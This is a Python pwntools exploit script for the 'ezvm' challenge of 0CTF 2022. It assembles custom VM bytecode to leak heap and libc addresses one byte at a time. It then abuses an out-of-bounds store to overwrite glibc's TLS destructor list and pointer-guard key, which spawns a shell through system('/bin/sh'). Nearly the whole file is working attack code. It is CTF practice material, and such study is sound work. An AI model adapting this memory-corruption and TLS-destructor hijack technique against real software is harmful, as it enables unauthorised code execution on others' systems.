from pwn import *
from assembler import *

ARG_MAP = {
        "push": [1],
        "pop": [1],
        "sub": [],
        "shr": [],
        "and": [],
        "jmp": [8],
        "jnz": [8],
        "jz": [8],
        "eq": [],
        "gt": [],
        "lt": [],
        "li": [1, 8],
        "sq": [1, 8],
        "lq": [1, 8],
        "hlt": [],
        "nop": [],
}


INS_MAP = {
        "push": 0,
        "pop": 1,
        "sub": 3,
        "shr": 8,
        "and": 9,
        "jmp": 14,
        "jnz": 15,
        "jz": 16,
        "eq": 17,
        "gt": 18,
        "lt": 19,
        "li": 20,
        "sq": 21,
        "lq": 22,
        "hlt": 23,
        "nop": 24,
}

@Instruction.unpack_insn
def do_unpack_insn(mnemonic) -> tuple[int, list[int]]:
    # Return the opcode value (int) and a list of operand sizes (in bits) for this mnemonic
    return INS_MAP[mnemonic], list(map(lambda x: x*8, ARG_MAP[mnemonic]))

def run_vm(prog, mem_count, msg):
    assembler = Assembler(prog)
    code = assembler.assemble(debug=True)
    p.sendlineafter(b"Please input your code size:\n", b"%d" % len(code))
    p.sendlineafter(b"Please input your memory count:\n", b"%d" % mem_count)
    p.sendafter(b"Please input your code:\n", code)
    out = p.recvuntil(b"finish!\n")
    p.sendlineafter(b"continue?\n", msg)
    return out


def leak(p, mem_size, num_bytes):
    leak_byte = """
lq r0, 0;
push r0;
li r3, {byte_idx};
push r3;
shr;
pop r3;
push r3;
li r1, 0xff;
push r1;
and;
pop r1;
li r2, 0x1;
.loop:
push r1;
push r2;
sub;
pop r1;
push r1;
jnz loop;
hlt;
    """
    leaked_bytes = []
    for x in range(num_bytes):
        prog = leak_byte.format(byte_idx=x*8)
        output = run_vm(prog, mem_size, b"B"*10).decode("utf-8").strip()
        leaked_byte = output.split("\n").count("what???")
        leaked_bytes = [leaked_byte] + leaked_bytes

    leaked_addr = 0
    for x in leaked_bytes:
        leaked_addr = (leaked_addr << 8) + x

    log.success(f"Leaked value : {hex(leaked_addr)}")
    return leaked_addr


def exploit(p, heap_base, fs_base, libc_base):
    system = libc_base + 0x50d60
    binsh = libc_base + 0x1d8698
    log.success(f"system @ {hex(system)}")
    log.success(f"binsh @ {hex(binsh)}")

    heap_chunk = heap_base + 0x390 + 0x40
    log.success(f"fake tls list at {hex(heap_chunk)}")

    xor_key = fs_base + 0x30
    tls_dtors_list = fs_base - 0x58

    log.success(f"xor_key @ {hex(xor_key)}")
    log.success(f"tls_dtors_list @ {hex(tls_dtors_list)}")

    payload = f"""
li r0, {system << 0x11};
li r1, {binsh};
li r2, {heap_chunk};
sq r0, 6;
sq r1, 7;
sq r2, {(tls_dtors_list-(heap_chunk-0x30))//8};
sq r3, {(xor_key-(heap_chunk-0x30))//8};
"""
    run_vm(payload, 0x2000000000000000 | 0x100, b"C"*10)
    
    p.sendlineafter(b"Please input your code size:\n", b"1024")


def main(p):
    payload = b"A"*128
    p.sendlineafter(b"Welcome to 0ctf2022!!", payload)

    run_vm("nop;\n"*3, 4, b"B"*10)
    heap_base = leak(p, mem_size=4, num_bytes=5) << 12

    run_vm("nop;\n"*3, 0x100, b"B"*10)
    libc_leak = leak(p, mem_size=0x100, num_bytes=6)

    libc_base = libc_leak - 0x219ce0

    fs_base = libc_leak - 0x21c5a0
    log.success(f"Leaked fs at {hex(fs_base)}")

    exploit(p, heap_base, fs_base, libc_base)


if __name__ == '__main__':
    p = process("./ezvm")
    main(p)
    p.interactive()
